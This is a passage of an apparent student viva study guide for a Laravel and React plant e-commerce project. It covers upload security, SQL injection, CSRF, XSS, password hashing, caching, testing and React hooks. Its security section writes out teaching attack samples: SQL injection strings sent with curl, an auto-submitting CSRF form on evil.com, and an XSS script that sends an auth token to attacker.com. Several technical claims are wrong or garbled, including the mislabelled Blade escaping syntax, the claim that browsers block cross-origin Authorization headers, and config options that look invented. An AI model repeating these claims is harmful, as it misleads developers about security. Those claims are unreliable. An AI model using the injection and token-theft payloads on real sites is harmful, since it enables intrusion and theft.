    ]);
    
    if ($request->hasFile('image')) {
        // Store outside public folder for extra security
        $path = $request->file('image')->store(
            'plants',
            'private'  // Not directly accessible
        );
        
        // Generate thumbnail
        $thumb = $this->generateThumbnail($path);
        
        Plant::create([
            'image' => $path,
            'thumbnail' => $thumb,
        ]);
    }
}
```

**Security Best Practices:**

1. **Whitelist extensions**
```php
'image' => 'mimes:jpeg,png,jpg'
```

2. **Validate file size**
```php
'image' => 'max:2048'  // 2MB
```

3. **Store outside public folder**
```php
// Bad
Storage::disk('public')->put('uploads/file.php');
// User can access: /storage/uploads/file.php

// Better
Storage::disk('private')->put('uploads/file.jpg');
// Stored outside public folder
```

4. **Rename files to remove original name**
```php
$file->hashName('plants');
// Original: monstera.jpg
// Stored as: plants/abc123def456.jpg
// Prevents .php.jpg tricks
```

5. **Set proper permissions**
```php
// Images are read-only
chmod(storage_path('plants/*'), 0444);
```

6. **Disable script execution in upload dir**
```php
// .htaccess in storage/app/public/plants/
<FilesMatch "\.php$">
    Deny from all
</FilesMatch>
```

---

## K) Security (Critical for Viva)

### Q51: What is SQL injection? How do you prevent it?

**Answer:**

**SQL Injection**: Inserting malicious SQL code through user input.

**Example (Vulnerable Code):**
```php
// BAD - NEVER DO THIS!
$email = $request->input('email');
$user = DB::select("SELECT * FROM users WHERE email = '" . $email . "'");

// If user enters: ' OR '1'='1
// Query becomes:
// SELECT * FROM users WHERE email = '' OR '1'='1'
// This returns ALL users! Security breach!

// Or even worse:
// ' DROP TABLE users; --
// Query becomes:
// SELECT * FROM users WHERE email = '' DROP TABLE users; --'
// Deletes entire table!
```

**Prevention 1: Prepared Statements (Our approach with Eloquent)**
```php
// GOOD - Use Eloquent
$user = User::where('email', $request->email)->first();
// Eloquent uses prepared statements automatically!

// Laravel parameterizes:
// SELECT * FROM users WHERE email = ?
// Parameter: user_input (treated as data, not SQL)

// Even if user enters: ' OR '1'='1
// Query: SELECT * FROM users WHERE email = '\' OR \'1\'=\'1'
// Returns nothing (treated as literal string)
```

**Prevention 2: Raw Queries with Parameters**
```php
// If you need raw SQL
$email = $request->email;
$user = DB::select('SELECT * FROM users WHERE email = ?', [$email]);
// ? is placeholder for parameter
// Parameter passed separately - never mixed with SQL
```

**Prevention 3: Query Builder**
```php
// Always use Eloquent or Query Builder
$users = DB::table('users')
    ->where('email', $email)  // Parameterized
    ->get();

// Never concatenate strings into queries!
// NEVER: ->whereRaw("email = '" . $email . "'")
```

**How Eloquent/Laravel Protects:**

1. **Parameterized Queries**: SQL sent separately from data
2. **Input Validation**: Validate data format first
3. **Escaped Output**: HTML entities for display

**Testing vulnerability:**
```bash
# Normal login
curl -X POST /api/login \
  -d 'email=user@test.com&password=pass'
  # Works normally

# SQL Injection attempt
curl -X POST /api/login \
  -d "email=' OR '1'='1'--&password=anything"
  # With prepared statements: fails (no match)
  # Without: returns all users (BREACH!)
```

---

### Q52: What is CSRF (Cross-Site Request Forgery)? How do you prevent it?

**Answer:**

**CSRF**: Attacker tricks user into making unwanted requests.

**Attack Scenario:**
```
1. User logs into bank.com in one tab
2. User visits evil.com in another tab
3. evil.com has hidden form:
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit();</script>
4. Form auto-submits using user's logged-in session
5. Bank transfers money to attacker!
```

**Prevention: CSRF Token**

Laravel uses CSRF tokens for web (sessions):
```php
// web routes
Route::post('/transfer', [BankController::class, 'transfer'])
    ->middleware('web');  // Includes VerifyCsrfToken middleware

// Middleware checks for token
// GET /transfer shows form with:
<form method="POST">
    @csrf  {{-- Blade helper adds token --}}
    <input name="amount">
</form>

// POST requires correct token
// If token missing or wrong → 419 error
```

**For APIs (Our Project - Sanctum):**
We don't need CSRF tokens because:

1. **Stateless Authentication**: Token in header, not cookie
2. **Same-Origin Requests**: React frontend on same domain
3. **Sanctum Provides**: Built-in CSRF protection option

```php
// API routes
Route::middleware('auth:sanctum')->group(function () {
    Route::post('/cart', [CartController::class, 'store']);
    // No CSRF token needed
    // Token-based auth (Authorization header) is CSRF-safe
});

// Attacker can't forge Authorization header from another site
// Browser blocks cross-origin Authorization headers
```

**Why APIs are safe from CSRF:**

```
Browser CORS Policy:
- Can't send Authorization headers cross-origin
- Can send cookies cross-origin (can't use HttpOnly cookies)
- Our API uses Bearer token in header → Safe!

// This won't work from evil.com
fetch('http://bank.com/api/transfer', {
    headers: {
        'Authorization': 'Bearer token'
        // Browser: NO! Cross-origin, denied!
    }
});
```

---

### Q53: What is XSS (Cross-Site Scripting)? How do you prevent it?

**Answer:**

**XSS**: Injecting JavaScript that runs in user's browser.

**Example (Vulnerable):**
```php
// User submits comment: <script>alert('hacked!')</script>

// If you display it as-is:
<p><?php echo $comment->text; ?></p>
// Output: <p><script>alert('hacked!')</script></p>
// JavaScript executes in every user's browser!

// Attacker could inject:
<script>
  // Steal user's auth token
  fetch('attacker.com/steal?token=' + localStorage.token);
</script>
```

**Prevention 1: Escape Output**

```php
// GOOD - Escape HTML
<p><?php echo e($comment->text); ?></p>
// Converts: < > " ' to HTML entities
// Output: <p>&lt;script&gt;alert('hacked!')&lt;/script&gt;</p>
// Displays as text, not executed!

// Blade automatically escapes:
<p>{{ $comment->text }}</p>  // PHP short tag already escapes!
<p>{!! $comment->text !!}</p>  // Double braces - raw content (be careful!)
```

**Prevention 2: Content Security Policy**

```php
// Set header to restrict script sources
header("Content-Security-Policy: script-src 'self'");
// Only allows scripts from same domain
// Blocks inline scripts and external scripts

// In Laravel (bootstrap/app.php):
$kernel->middleware([
    \Illuminate\Http\Middleware\SetCacheHeaders::class,
    // Custom middleware to set CSP headers
]);
```

**Prevention 3: Input Validation**

```php
$request->validate([
    'comment' => 'required|string|max:500'
    // Doesn't prevent XSS directly, but...
]);

// Add custom rule:
'comment' => [
    'required',
    new NoHtmlTags(),  // Custom rule
]
```

**In Our React Frontend:**

```js
// React automatically escapes by default!
const comment = '<script>alert("xss")</script>';

// SAFE - React escapes HTML
<p>{comment}</p>
// Output: <p>&lt;script&gt;alert("xss")&lt;/script&gt;</p>

// DANGEROUS - Raw HTML (never use user data with this!)
<p dangerouslySetInnerHTML={{__html: comment}} />
// Only use with trusted content, never user input!
```

**To prevent XSS use:**
1. Escape output always
2. Validate and sanitize input
3. Set Content-Security-Policy headers
4. Use libraries like DOMPurify if needing HTML

---

### Q54: What is password hashing? Why not store passwords as plain text?

**Answer:**

**Plain Text (NEVER do this!):**
```
users table:
| id | email | password |
| 1  | john@email.com | mypassword123 |

Problems:
- If database hacked, all passwords leaked
- Can see employees' passwords
- Users reuse passwords (compromises other sites too)
- Regulatory violation (GDPR, etc)
```

**Hashed (What we do):**
```
users table:
| id | email | password |
| 1  | john@email.com | $2y$10$abc123def456xyz... |

Benefits:
- Even if database hacked, passwords safe
- Can't reverse-engineer original password
- One-way function: password → hash (easy)
- But: hash → password (impossible)
```

**How it works:**

```php
// Register
$password = 'mypassword123';
$hashed = Hash::make($password);
// Laravel: $2y$10$...64 character hash

// Compare (login)
if (Hash::check($passwordFromForm, $hashedFromDB)) {
    // Correct password
} else {
    // Wrong password
}
```

**How hashing is one-way:**

```
Plain text password: "mypassword123"
  ↓ (Hash function)
$2y$10$N9qo8uLOickgx2ZMRZoMye1qPqBBkQUEn...

Can't reverse: 
$2y$10$N9qo8uLOickgx2ZMRZoMye1qPqBBkQUEn... 
  ↓ (impossible!)
"mypassword123"

Only way: Try millions of passwords and hash each one
```

**In Our Project:**

```php
// AuthController::register()
public function register(Request $request) {
    $request->validate([
        'email' => 'required|email|unique:users',
        'password' => 'required|min:6|confirmed',  // Must match password_confirmation
    ]);
    
    User::create([
        'email' => $request->email,
        'password' => Hash::make($request->password),  // Hash before storing!
    ]);
}

// AuthController::login()
public function login(Request $request) {
    $user = User::where('email', $request->email)->first();
    
    // Check password by hashing and comparing
    if (!Hash::check($request->password, $user->password)) {
        return response()->json(['error' => 'Invalid'], 401);
    }
    
    $token = $user->createToken('auth_token')->plainTextToken;
    return response()->json(['token' => $token]);
}
```

**Hash Algorithms:**

| Algorithm | Cost | Speed | Safety |
|-----------|------|-------|--------|
| bcrypt (ours) | 10 | Slow (intentional) | Excellent |
| argon2 | Adaptive | Very slow | Excellent |
| scrypt | High | Very slow | Excellent |
| md5 | None | Fast | BROKEN |
| sha1 | None | Fast | BROKEN |

**Why slow is better:**
```
Hacker has password database:
- Fast hash (0.000001s per try): 1 billion attempts/sec
- Slow hash (0.1s per try): 10 attempts/sec
- 1 million passwords: 1 day vs 115 days to crack!
```

---

### Q55: What is rate limiting? Why do you need it?

**Answer:**

**Rate Limiting**: Restrict how many requests per time period.

**Without Rate Limiting:**
```
Attacker script:
for (let i = 0; i < 1000000; i++) {
    fetch('/api/login', {
        body: {email, password: randomPassword()}
    });
}

Result:
- 1 million login attempts per second
- Brute force cracks password in minutes
- Server overloaded (Denial of Service)
```

**With Rate Limiting:**
```
Middleware checks IP address:
- Request 1: OK (1/60 per minute)
- Request 2: OK (2/60 per minute)
- ...
- Request 61: BLOCKED (429 Too Many Requests)
- Wait 1 minute...
- Request 62: OK (reset to 1/60)
```

**In Laravel:**

```php
// Using throttle middleware
Route::post('/login', [AuthController::class, 'login'])
    ->middleware('throttle:5,1');
    // Max 5 requests per 1 minute

// More specific
Route::middleware('throttle:global')->group(function () {
    // Global rate limit for all routes
});

Route::middleware('throttle:auth:60,1')->group(function () {
    // 60 requests per 1 minute for authenticated users
});
```

**Implement Custom Rate Limiting:**

```php
// Create middleware
php artisan make:middleware RateLimitLogin

// app/Http/Middleware/RateLimitLogin.php
class RateLimitLogin {
    public function handle($request, $next) {
        $key = 'login_attempts_' . $request->ip();  // Key per IP
        $maxAttempts = 5;
        $decayMinutes = 15;
        
        // Check if too many attempts
        if (Cache::has($key) && Cache::get($key) >= $maxAttempts) {
            return response()->json([
                'error' => 'Too many login attempts. Try again in 15 minutes.'
            ], 429);
        }
        
        // Increment attempt counter
        Cache::increment($key, 1);
        Cache::put($key, Cache::get($key), now()->addMinutes($decayMinutes));
        
        return $next($request);
    }
}

// Use it
Route::post('/login', [AuthController::class, 'login'])
    ->middleware(RateLimitLogin::class);
```

**Redis-based Rate Limiting (Scalable):**

```php
// Uses Redis for distributed rate limiting
$limit = RateLimiter::attempt(
    'login_' . $request->ip(),
    $perMinute = 5,
    $callback = function () {
        // Executed when limit exceeded
        return response()->json(['error' => 'Too many attempts'], 429);
    }
);

if (!$limit) {
    return response()->json(['error' => 'Rate limited'], 429);
}
```

**Rate Limiting DTO Header:**

```
HTTP/1.1 200 OK
RateLimit-Limit: 60
RateLimit-Remaining: 45
RateLimit-Reset: 1645123456

Client can check these headers:
- Limit: 60 requests allowed
- Remaining: 45 requests left
- Reset: Unix timestamp when counter resets
```

---

## L) Performance & Scaling

### Q56: How do you optimize database queries? (Indexes, N+1 problem)

**Answer:**

**Problem 1: Missing Indexes**

```php
// Query without index - scans entire table
$plant = Plant::where('slug', 'monstera')->first();  // Slow!

// SQL: SELECT * FROM plants WHERE slug = 'monstera'
// Database scans all 10,000 plants to find match
```

**Solution - Add Index in Migration:**

```php
// Create migration
php artisan make:migration add_slug_index_to_plants_table

// database/migrations/...
Schema::table('plants', function (Blueprint $table) {
    $table->index('slug');  // Create index on slug column
});

// SQL equivalent
CREATE INDEX plants_slug_index ON plants(slug);

// Now same query is fast!
// Database uses index - finds in milliseconds
```

**Problem 2: N+1 Query Problem** (We discussed this earlier)

```php
// BAD: 1 + N queries
$plants = Plant::all();  // Query 1
foreach ($plants as $plant) {
    echo $plant->reviews->average();  // N more queries!
}

// GOOD: 2 queries total
$plants = Plant::with('reviews')->get();  // Loads plants + all reviews
foreach ($plants as $plant) {
    echo $plant->reviews->average();  // No query! Data already loaded
}
```

**Common Indexes to Add:**

```php
Schema::table('plants', function (Blueprint $table) {
    $table->index('category');  // If filtering by category
    $table->unique('slug');     // Unique values
    $table->index('created_at');  // If sorting by date
    $table->index(['category', 'price']);  // Compound index
});

// Foreign keys are usually indexed already
$table->foreign('user_id')->references('id')->on('users');
// This automatically creates index on user_id
```

**Eager Loading (N+1 Prevention):**

```php
// BAD
$orders = Order::all();
foreach ($orders as $order) {
    echo $order->user->name;  // N+1: 1 original + N user queries
}

// GOOD - With eager loading
$orders = Order::with('user')->get();
// 2 queries: orders + users
foreach ($orders as $order) {
    echo $order->user->name;  // No additional query
}

// Load multiple relationships
$orders = Order::with([
    'user',
    'items.plant',
    'payment'
])->get();
```

**Pagination (Don't load all):**

```php
// BAD - Loads all 10,000 plants
$plants = Plant::all();
// Then paginate in PHP

// GOOD - Database does pagination
$plants = Plant::paginate(15);
// Query: SELECT * FROM plants LIMIT 15 OFFSET 0
// Much faster, less memory

// In API
GET /api/plants?page=1&per_page=15
// Returns 15 plants, total count, etc
```

**Query Caching:**

```php
// Cache frequently accessed data
$plants = Cache::remember('all_plants', 3600, function () {
    return Plant::with('reviews')->get();
    // Query until cache expires (1 hour)
});

// Invalidate when plant updated
Plant::created(function() {
    Cache::forget('all_plants');
});
```

---

### Q57: How do you make your API responses faster? (Response formatting, JSON)

**Answer:**

**Problem:** API returns too much data, or takes long to format

**Before Optimization:**
```
Request: GET /api/plants
Response Time: 2.5 seconds
Response Size: 50MB
```

**After Optimization:**
```
Request: GET /api/plants?per_page=15
Response Time: 200ms
Response Size: 150KB
```

**Fix 1: Return only needed fields**

```php
// BAD - Returns ALL fields
public function index() {
    return Plant::all();  // Returns id, name, price, description, 
                         // created_at, updated_at, image, internal_notes...
}

// GOOD - Use select()
public function index() {
    return Plant::select('id', 'name', 'price', 'image')->get();
    // Only 4 fields
}

// Or use Resources (Laravel best practice)
class PlantResource extends JsonResource {
    public function toArray($request) {
        return [
            'id' => $this->id,
            'name' => $this->name,
            'price' => $this->price,
            'image_url' => $this->image ? url('storage/' . $this->image) : null,
        ];
    }
}

public function index() {
    return PlantResource::collection(Plant::paginate(15));
}
```

**Fix 2: Pagination (Don't return all records)**

```php
// BAD - Returns 10,000 plants
GET /api/plants
// 50MB response

// GOOD - Return paginated
GET /api/plants?page=1&per_page=15
// 150KB response
// 200ms response time

// Add links to next/prev page
{
    "data": [...],
    "meta": {
        "current_page": 1,
        "per_page": 15,
        "total": 10000,
        "last_page": 667
    },
    "links": {
        "first": "/api/plants?page=1",
        "next": "/api/plants?page=2",
        "prev": null
    }
}
```

**Fix 3: Lazy Load Relationships**

```php
// BAD - Returns all reviews for every plant
$plants = Plant::with('reviews')->get();
// Plant 1: [10 reviews]
// Plant 2: [150 reviews]  
// Plant 3: [500 reviews]
// Huge response!

// GOOD - Only count, not full reviews
$plants = Plant::withCount('reviews')
    ->withAvg('reviews', 'rating')
    ->get();
// Returns: {id, name, reviews_count: 10, reviews_avg_rating: 4.5}
// Small, fast!

// Only load reviews if requested
GET /api/plants?include=reviews
// Include relationship if client needs it
```

**Fix 4: Use Select and Eager Load Optimally**

```java
// BEST PRACTICE
public function index(Request $request) {
    $query = Plant::select('id', 'name', 'price', 'image')
        ->where('is_active', true);
    
    // Optional eager load
    if ($request->include_reviews) {
        $query->withAvg('reviews', 'rating')
              ->withCount('reviews');
    }
    
    return PlantResource::collection(
        $query->paginate(15)
    );
}

// Response
{
    "data": [
        {
            "id": 1,
            "name": "Monstera",
            "price": 1500,
            "image_url": "http://...",
            "reviews_avg_rating": 4.5,
            "reviews_count": 10
        }
    ]
}
```

**Fix 5: Response Compression**

```php
// Enable gzip compression
// .htaccess or server config
<IfModule mod_deflate.c>
    AddOutputFilterByType DEFLATE text/html application/json
</IfModule>

// Reduces response size by 70-80%!
// 50MB → 10MB response
```

---

### Q58: How do you monitor and debug slow queries?

**Answer:**

**Method 1: Laravel Debugbar (Development)**

```bash
composer require barryvdh/laravel-debugbar --dev

# Now debugbar shows at bottom of every page
# Displays:
# - All SQL queries with execution time
# - Number of queries
# - Time spent in database
# - Memory usage
```

**Method 2: Query Logging**

```php
// Enable query logging
DB::enableQueryLog();

// Run your code
$plants = Plant::all();

// See all queries
$queries = DB::getQueryLog();
foreach ($queries as $query) {
    echo $query['query'];  // SELECT * FROM plants
    echo $query['time'];   // 0.45 milliseconds
}

// Production logging
Log::info('Query: ' . $query['query'] . ' Time: ' . $query['time']);
```

**Method 3: Code Profiling**

```php
$start = microtime(true);

$plants = Plant::with('reviews')->paginate(15);

$time = microtime(true) - $start;
echo "Request took: {$time}s";

// Track different parts
$t1 = microtime(true);
$plants = Plant::with('reviews')->get();  // 0.5s
$getData = microtime(true) - $t1;

$t2 = microtime(true);
// Format response  // 0.1s  
$t2Result = microtime(true) - $t2;

echo "DB Query: {$getData}s\nFormatting: {$t2Result}s";
```

**Method 4: Find Slow Queries in Production**

```php
// Log slow queries (> 1 second)
'connections' => [
    'mysql' => [
        'driver' => 'mysql',
        'slow_query_log' => true,
        'slow_query_threshold' => 1000,  // milliseconds
    ]
],

// Or monitoring service
use Sentry\Laravel\Integration;
Integration::capturePerformance();
// Sends slow queries to Sentry
```

---

### Q59: When should you use caching? Redis vs File caching?

**Answer:**

**When to Cache:**

1. **Database queries** - Expensive calculations
2. **External API calls** - Slow third-party services
3. **Generated reports** - Takes time to calculate
4. **Static pages** - Never changes

**Don't Cache:**
- Real-time data (current price, stock)
- User-specific data (unless per-user cache key)
- Recently updated data

**Caching Types:**

**File Cache (Simple):**
```php
// Store in storage/framework/cache/
Cache::put('plants_list', $plants, 3600);  // 1 hour
$plants = Cache::get('plants_list');  // Retrieve

// Check if exists
if (Cache::has('plants_list')) {
    $plants = Cache::pull('plants_list');  // Get and delete
}

// Forget
Cache::forget('plants_list');
```

**Redis Cache (Scalable):**
```
Redis: In-memory database
- Much faster than file cache
- Distributed (multiple servers)
- Expires automatically
- Perfect for production
```

**Remember Pattern (Automatic):**
```php
// If cache exists, return it
// If not, execute callback and cache result
$plants = Cache::remember('plants_list', 3600, function () {
    return Plant::with('reviews')->get();
    // Executes only if cache doesn't exist
});

// Keep it simple:
if ($plants = Cache::get('plants_list')) {
    return $plants;  // From cache
}

// Fetch from DB
$plants = Plant::get();
Cache::put('plants_list', $plants, 3600);  // Cache it
return $plants;
```

**Cache Invalidation:**

```php
// When plant is created/updated, invalidate cache
Plant::created(function () {
    Cache::forget('plants_list');
    Cache::forget('plants_homepage');
});

Plant::updated(function() {
    Cache::forget('plants_list');
});

Plant::deleted(function() {
    Cache::forget('plants_list');
});
```

**Tag-based Caching:**

```php
// Group related caches
Cache::tags(['plants', 'products'])->put('plants_list', $plants);

// Forget all plants caches
Cache::tags('plants')->flush();  // Clears all related caches

// Useful for bulk invalidation
```

---

## M) Testing

### Q60: What types of tests should you write? Unit vs. Feature tests?

**Answer:**

**Unit Tests** - Test single function/method in isolation

```php
// tests/Unit/PlantTest.php
class PlantTest extends TestCase {
    public function test_plant_has_valid_price() {
        $plant = new Plant([
            'name' => 'Monstera',
            'price' => 1500,
        ]);
        
        $this->assertTrue($plant->price > 0);
    }
    
    public function test_plant_slug_is_created() {
        $plant = Plant::factory()->create(['name' => 'Test Plant']);
        $this->assertNotNull($plant->slug);
    }
}
```

**Feature Tests** - Test API endpoints/full workflows

```php
// tests/Feature/PlantApiTest.php
class PlantApiTest extends TestCase {
    public function test_can_list_plants() {
        $plants = Plant::factory(5)->create();
        
        $response = $this->getJson('/api/plants');
        
        $response->assertStatus(200);
        $response->assertJsonCount(5, 'data');
    }
    
    public function test_can_create_plant_as_admin() {
        $admin = User::factory()->admin()->create();
        
        $response = $this->actingAs($admin)->postJson('/api/plants', [
            'name' => 'New Plant',
            'price' => 2000,
        ]);
        
        $response->assertStatus(201);
        $this->assertDatabaseHas('plants', ['name' => 'New Plant']);
    }
    
    public function test_unauthorized_user_cannot_create_plant() {
        $user = User::factory()->create();  // Regular user
        
        $response = $this->actingAs($user)->postJson('/api/plants', [
            'name' => 'New Plant',
        ]);
        
        $response->assertStatus(403);  // Forbidden
    }
}
```

**Comparison:**

| Type | What | When | Speed |
|------|------|------|-------|
| Unit | Single method | Calculation logic | Fast |
| Feature | API endpoint | User workflows | Medium |
| Integration | Multiple systems | Database + API | Slow |
| E2E | Full app | Browser testing | Very Slow |
| Performance | Benchmarks | Load testing | Slow |

**Test-Driven Development (TDD):**

1. Write test that fails
2. Write code to make it pass
3. Refactor if needed
4. Repeat

**For our project, good tests would be:**

```php
// Auth tests
test_user_can_login_with_valid_credentials()
test_user_cannot_login_with_invalid_password()
test_unauthenticated_user_cannot_access_cart()

// Plant tests
test_can_list_plants()
test_can_create_plant_as_admin()
test_regular_user_cannot_create_plant()
test_plant_stock_decreases_on_checkout()

// Cart tests
test_can_add_plant_to_cart()
test_cannot_add_nonexistent_plant()
test_cart_total_calculates_correctly()
test_cart_clears_after_checkout()

// Order tests
test_can_checkout()
test_order_contains_cart_items()
test_stock_decreases_after_order()
test_cannot_checkout_with_insufficient_stock()
```

---

## N) React Hooks & State Management

### Q61: What are React hooks? Explain useState and useEffect.

**Answer:**

**React Hooks** - Functions to use state and side effects in functional components (no need for classes)

**useState - Manage component state:**

```jsx
import { useState } from 'react';

export function Cart() {
    const [items, setItems] = useState([]);  // [currentValue, setFunction]
    const [total, setTotal] = useState(0);
    const [loading, setLoading] = useState(false);
    
    // items = [] (initial value)
    // setItems = function to update items
    
    const addPlant = (plant) => {
        setItems([...items, plant]);  // Add new plant to array
        setTotal(total + plant.price);  // Update total
    };
    
    return (
        <>
            <p>Items: {items.length}</p>
            <p>Total: {total}</p>
            <button onClick={() => addPlant(newPlant)}>Add</button>
        </>
    );
}
```

**How useState works:**

```
Initial render:
items = []
total = 0

User clicks "Add Plant"
↓
setItems([...items, new_plant])
setTotal(total + 1500)
↓
React re-renders component with new state
↓
Return new JSX with updated values
↓
UI updates with new items and total
```

**useEffect - Run side effects (API calls, subscriptions, timers):**

```jsx
import { useEffect, useState } from 'react';

export function Plants() {
    const [plants, setPlants] = useState([]);
    const [loading, setLoading] = useState(true);
    
    // Dependency array = when to run effect
    useEffect(() => {
        // This function runs AFTER component renders
        console.log('Component mounted or dependencies changed');
        
        // Fetch plants
        fetch('/api/plants')
            .then(res => res.json())
            .then(data => {
                setPlants(data.data);
                setLoading(false);
            });
        
        // Cleanup function (optional)
        return () => {
            console.log('Component will unmount');
        };
    }, []);  // Empty dependency = run once on mount
    
    if (loading) return <p>Loading...</p>;
    
    return (
        <div>
            {plants.map(plant => (
                <p key={plant.id}>{plant.name}</p>
            ))}
        </div>
    );
}
```

**Dependency Array:**

```jsx
// Run once on mount
useEffect(() => {
    fetchData();
}, [])

// Run every time component renders
useEffect(() => {
    console.log('Every render!');
})

// Run when 'id' changes
useEffect(() => {
    fetchPlantDetails(id);
}, [id])  // Re-run if id changes

// Run when 'id' or 'category' changes
useEffect(() => {
    fetchFiltered(id, category);
}, [id, category])
```

**Common Mistakes:**

```jsx
// WRONG - Missing dependency
useEffect(() => {
    fetchPlants();  // Infinite loop!
    // Should have [] or [id]
})

// WRONG - Abruptly changing state
const [count, setCount] = useState(0);
setCount(count + 1);

// Better - Use updater function
setCount(prev => prev + 1);

// Handle async properly
useEffect(() => {
    const fetchData = async () => {
        const res = await fetch('/api/data');
        const data = await res.json();
        setData(data);
    };
    
    fetchData();  // Call the async function
}, []);
```

---

### Q62: What is the difference between state and props?

**Answer:**

**Props** - Data passed FROM parent TO child (read-only)

```jsx
// Parent
<ProductCard 
    name="Monstera"
    price={1500}
    onAddToCart={handleAddToCart}
/>

// Child (ProductCard.tsx)
function ProductCard({name, price, onAddToCart}) {
    return (
        <>
            <h2>{name}</h2>  {/* Use prop */}
            <p>${price}</p>
            <button onClick={() => onAddToCart(name)}>
                Add to Cart
            </button>
        </>
    );
}
```

**State** - Data owned BY component (changeable)

```jsx
function ProductCard({name, price}) {
    const [quantity, setQuantity] = useState(1);  // State
    const [inCart, setInCart] = useState(false);  // State
    
    const handleAddToCart = () => {
        setQuantity(quantity + 1);  // Change state
        setInCart(true);  // Change state
    };
    
    return (
        <>
            <h2>{name}</h2>  {/* Prop */}
            <p>${price}</p>  {/* Prop */}
            <p>Qty: {quantity}</p>  {/* State */}
            <button onClick={handleAddToCart} disabled={inCart}>
                {in Cart ? 'In Cart' : 'Add to Cart'}  {/* State */}
            </button>
        </>
    );
}
```

**Comparison:**

| Aspect | Props | State |
|--------|-------|-------|
| **Source** | Parent passes | Component owns |
| **Mutable** | ❌ Read-only | ✅ Can change |
| **Change trigger** | Re-render parent | Re-render self |
| **Scope** | Parent → Child | Local to component |
| **Use for** | Configuration | Dynamic data |

**Data Flow Rule:**

```
Parent State
    ↓ (passes as props)
Child Props
    ↓ (can't change, must call parent function)
Parent Updates State
    ↓ (re-renders, passes new props)
Child Re-renders with new props
```

---

### Q63: How do you manage shared state across multiple components? (Context API vs Props Drilling)

**Answer:**

**Problem: Props Drilling**

```jsx
// App.tsx
function App() {
    const [user, setUser] = useState(null);
    
    return <Header user={user} />;
}

// Header.tsx
function Header({user}) {
    return <Nav user={user} />;  // Pass down
}

// Nav.tsx  
function Nav({user}) {
    return <UserMenu user={user} />;  // Pass down again
}

// UserMenu.tsx
function UserMenu({user}) {
    return <p>{user?.name}</p>;  // Finally use it!
}

// Problem: Passing user through 3 components just to use it in UserMenu!
// Imagine 10 levels deep...
```

**Solution 1: Context API (Recommended for small apps)**

```jsx
// Create context
import { createContext } from 'react';

export const UserContext = createContext<User | null>(null);

// Provider component
export function UserProvider({children}: {children: React.ReactNode}) {
    const [user, setUser] = useState<User | null>(null);
    
    useEffect(() => {
        // Load user on mount
        fetch('/api/profile')
            .then(res => res.json())
            .then(data => setUser(data.user));
    }, []);
    
    return (
        <UserContext.Provider value={{user, setUser}}>
            {children}
        </UserContext.Provider>
    );
}

// Wrap app with provider
// main.tsx
root.render(
    <UserProvider>
        <App />
    </UserProvider>
);

// Use in any component
import { useContext } from 'react';
import { UserContext } from './UserContext';

function UserMenu() {
    const {user} = useContext(UserContext);
    return <p>{user?.name}</p>;  // No props drilling!
}
```

**Solution 2: Zustand Store (For complex state)**

```typescript
// stores/userStore.ts
import { create } from 'zustand';

interface User {
    id: number;
    name: string;
    email: string;
}

interface UserStore {
    user: User | null;
    setUser: (user: User | null) => void;
    logout: () => void;
}

export const useUserStore = create<UserStore>((set) => ({
    user: null,
    
    setUser: (user) => set({ user }),
    
    logout: () => set({ user: null }),
}));

// Use in components
import { useUserStore } from '@/stores/userStore';

function UserMenu() {
    const { user, logout } = useUserStore();
    
    return (
        <>
            <p>{user?.name}</p>
            <button onClick={logout}>Logout</button>
        </>
    );
}

// Multiple components can access same state
function Nav() {
    const { user } = useUserStore();
    return <>{user?.name}</>;
}

function Profile() {
    const { user, setUser } = useUserStore();
    return <button onClick={() => setUser({...user, name: 'New Name'})}>Update Name</button>;
}
```

**Comparison:**

| Solution | Props Drilling | Context API | Zustand |
|----------|----------------|-------------|---------|
| **Setup** | None | Medium | Easy |
| **Complexity** | Low | Medium | Medium |
| **Performance** | ✅ Good | ⚠ Can rerender all | ✅ Excellent |
| **DevTools** | ❌ No | ❌ No | ✅ Yes |
| **Scalability** | ❌ Poor | ✅ Good | ✅ Excellent |
| **For Projects** | Small | Medium | Large |

**What Our Project Should Use:**

For Nepal Cozy Care:
- **Login State**: Context API or Zustand (shared across app)
- **Cart State**: Zustand store (complex, many operations)
- **Filters**: Local state (only used in one page)

---

### Q64: What are custom hooks? When and why to create them?

**Answer:**

**Custom Hook** - Reusable logic extracted from components

**Example 1: useLocalStorage**

```typescript
// hooks/useLocalStorage.ts
export function useLocalStorage<T>(key: string, initialValue: T) {
    const [value, setValue] = useState<T>(() => {
        try {
            const item = window.localStorage.getItem(key);
            return item ? JSON.parse(item) : initialValue;
        } catch {
            return initialValue;
        }
    });
    
    const setStoredValue = (value: T) => {
        setValue(value);
        window.localStorage.setItem(key, JSON.stringify(value));
    };
    
    return [value, setStoredValue] as const;
}

// Use in component
function App() {
    const [isDarkMode, setIsDarkMode] = useLocalStorage('darkMode', false);
    
    return (
        <body className={isDarkMode ? 'dark' : 'light'}>
            <button onClick={() => setIsDarkMode(!isDarkMode)}>
                Toggle Dark Mode
            </button>
        </body>
    );
}
```

**Example 2: useFetch**

```typescript
// hooks/useFetch.ts
interface UseFetchResult<T> {
    data: T | null;
    loading: boolean;
    error: Error | null;
}

export function useFetch<T>(url: string): UseFetchResult<T> {
    const [data, setData] = useState<T | null>(null);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState<Error | null>(null);
    
    useEffect(() => {
        const fetchData = async () => {
            try {
                const response = await fetch(url);
                const result = await response.json();
                setData(result);
            } catch (err) {
                setError(err as Error);
            } finally {
                setLoading(false);
            }
        };
        
        fetchData();
    }, [url]);
    
    return { data, loading, error };
}

// Use
function Plants() {
    const { data: plants, loading, error } = useFetch('/api/plants');
    
    if (loading) return <p>Loading...</p>;
    if (error) return <p>Error: {error.message}</p>;
    
    return (
        <>
            {plants?.map(p => <p key={p.id}>{p.name}</p>)}
        </>
    );
}
```

**Example 3: useApi (With auth token)**

```typescript
// hooks/useApi.ts
export function useApi<T>(endpoint: string) {
    const [data, setData] = useState<T | null>(null);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState<string | null>(null);
    
    const callApi = useCallback(async (options: RequestInit = {}) => {
        setLoading(true);
        try {
            const token = localStorage.getItem('token');
            const headers = {
                'Content-Type': 'application/json',
                ...(token && { 'Authorization': `Bearer ${token}` }),
                ...options.headers,
            };
            
            const response = await fetch(endpoint, {
                ...options,
                headers,
            });
            
            if (response.status === 401) {
                localStorage.removeItem('token');
                window.location.href = '/login';
                return;
            }
            
            const result = await response.json();
            setData(result.data || result);
            setError(null);
        } catch (err) {
            setError((err as Error).message);
        } finally {
            setLoading(false);
        }
